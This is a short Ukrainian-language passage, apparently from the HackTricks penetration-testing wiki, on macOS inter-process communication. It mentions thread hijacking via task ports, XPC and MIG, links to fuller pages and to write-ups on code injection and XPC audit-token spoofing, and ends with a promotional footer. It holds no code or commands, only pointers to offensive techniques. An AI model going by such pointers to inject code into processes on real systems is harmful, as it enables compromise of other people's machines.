### Захоплення потоку через порт завдання <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

У цій техніці захоплюється потік процесу:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Основна інформація

XPC, що означає міжпроцесну комунікацію XNU (ядра, що використовується в macOS), є фреймворком для **комунікації між процесами** на macOS та iOS. XPC надає механізм для здійснення **безпечних, асинхронних викликів методів між різними процесами** в системі. Це частина парадигми безпеки Apple, що дозволяє **створювати додатки з розділенням привілеїв**, де кожен **компонент** працює з **необхідними дозволами** для виконання своєї роботи, тим самим обмежуючи можливість завданої шкоди від компрометованого процесу.

Для отримання додаткової інформації про те, як працює ця **комунікація** та як вона **може бути вразливою**, перегляньте:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Генератор інтерфейсу Mach

MIG був створений для **спрощення процесу створення коду Mach IPC**. Він, по суті, **генерує необхідний код** для взаємодії сервера та клієнта з вказаною ​​визначенням. Навіть якщо згенерований код виглядає некрасиво, розробнику просто потрібно імпортувати його, і його код буде набагато простішим, ніж раніше.

Для отримання додаткової інформації перегляньте:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Посилання

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану в HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.

</details>
